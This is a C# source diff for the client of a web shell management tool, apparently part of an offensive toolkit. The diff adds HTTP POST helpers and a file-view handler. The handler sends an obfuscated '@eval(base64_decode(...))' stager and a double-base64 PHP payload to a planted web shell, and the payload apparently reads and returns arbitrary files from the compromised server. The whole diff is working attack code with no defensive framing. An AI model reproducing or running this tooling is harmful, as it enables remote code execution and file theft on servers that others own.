@@ -1,6 +1,9 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.IO;
 using System.Linq;
+using System.Net;
+using System.Text;
 using System.Windows.Forms;
 
 namespace C2.Business.CastleBravo.WebShellTool
@@ -11,14 +14,16 @@ namespace C2.Business.CastleBravo.WebShellTool
 
         private string browserDicectory = string.Empty;
         private string commandDirectory = string.Empty;
+        private string Url;
+        private string result;
 
         public WebShellDetailsForm()
         {
             InitializeComponent();
         }
-
         public WebShellDetailsForm(WebShellTaskConfig info) : this()
         {
+            Url = info.Url;
             webShell = new WebShellClient(info.Url, info.Password, info.ClientVersion);
             UpdateBaseInfo(webShell.PHPInfo());
         }
@@ -53,18 +58,79 @@ namespace C2.Business.CastleBravo.WebShellTool
             this.baseInfoWebBrowser.DocumentText = result;
             this.messageLog.Text = webShell.FetchLog();
         }
-
+        
+        public void GetResultParam(HttpWebResponse resp)
+        {
+            string responseResult = string.Empty;
+            try
+            {
+                if (resp != null && resp.StatusCode == HttpStatusCode.OK)
+                {
+                    //Encoding readerEncode = encodeOutput == "UTF-8" ? Encoding.UTF8 : Encoding.Default;
+                    using (StreamReader sr = new StreamReader(resp.GetResponseStream()))
+                    {
+                        responseResult = sr.ReadToEnd();
+                        sr.Close();
+                    }
+                    resp.Close();
+                }
+            }
+            catch (Exception ex)
+            {
+                responseResult = ex.Message;
+            }
+            //string result = encodeOutput == "UTF-8" ? Encoding.UTF8.GetString(Encoding.UTF8.GetBytes(responseResult)) : Encoding.Default.GetString(Encoding.Default.GetBytes(responseResult));
+            result = responseResult;
+        }
+        
+        private void PostText(HttpWebRequest req, byte[] bytesToPost)
+        {
+            using (Stream reqStream = req.GetRequestStream())
+                reqStream.Write(bytesToPost, 0, bytesToPost.Length);
+            HttpWebResponse ResponseData = (HttpWebResponse)req.GetResponse();
+            GetResultParam(ResponseData);
+        }
+        
+        public void PostData(string ParaDara)
+        {
+            byte[] bytesToPost = Encoding.UTF8.GetBytes(ParaDara);
+            try
+            {
+                HttpWebRequest req = WebRequest.Create(Url) as HttpWebRequest;
+                req.Method = "POST";
+                req.Timeout = 5 * 1000;
+                req.ContentType = "application/x-www-form-urlencoded";
+                PostText(req, bytesToPost);
+            }
+            catch (Exception ex)
+            {
+                result = ex.Message;
+            }
+        }
+        
         private void FileManagerListView_MouseDoubleClick(object sender, MouseEventArgs e)
         {
             if (this.fileManagerListView.SelectedItems.Count == 0)
                 return;
 
             WSFile selectedFile = this.fileManagerListView.SelectedItems[0].Tag as WSFile;
-            if (selectedFile.Type != WebShellFileType.Directory)
-                return;
-
-            //TODO linux和windows拼接不一样，用path.combine拼不了linux路径？
-            UpdateFileManager(webShell.PathBrowser(browserDicectory + "/" + selectedFile.FileName)); 
+            if (selectedFile.Type == WebShellFileType.Directory)
+                UpdateFileManager(webShell.PathBrowser(browserDicectory + "/" + selectedFile.FileName));
+            if (selectedFile.Type == WebShellFileType.File)
+            {
+                //string PageData = selectedFile.FileName;
+                string PageData = browserDicectory + "/" + selectedFile.FileName;
+                byte[] bytes = Encoding.GetEncoding("UTF-8").GetBytes(PageData);
+                string base64PageData = Convert.ToBase64String(bytes);
+                string yxs = "@eval/*ABC*/(base64_decode(base64_decode($_REQUEST[action])));";
+                string action = "UUdsdWFWOXpaWFFvSW1ScGMzQnNZWGxmWlhKeWIzSnpJaXdpTUNJcE8wQnpaWFJmZEdsdFpWOXNhVzFwZENnd0tUdEFjMlYwWDIxaFoybGpYM0YxYjNSbGMxOXlkVzUwYVcxbEtEQXBPMlZqYUc4b0lpMCtmQ0lwT3pza1JqMWlZWE5sTmpSZlpHVmpiMlJsS0NSZlVFOVRWRnNpZWpFaVhTazdKRkE5UUdadmNHVnVLQ1JHTENKeUlpazdaV05vYnloQVpuSmxZV1FvSkZBc1ptbHNaWE5wZW1Vb0pFWXBLU2s3UUdaamJHOXpaU2drVUNrN08yVmphRzhvSW53OExTSXBPMlJwWlNncE93PT0%3d";
+                string z1 = base64PageData;
+                string Paradata = "yxs=" + yxs+ "&action=" + action + "&z1=" + z1;
+                PostData(Paradata);
+                DetailsPageForm frm = new DetailsPageForm();
+                frm.richTextBox1.Text = result;
+                frm.ShowDialog();
+            }
         }
 
         private void UpdateFileManager(Tuple<string, List<WSFile>, List<string>> pathFiles)
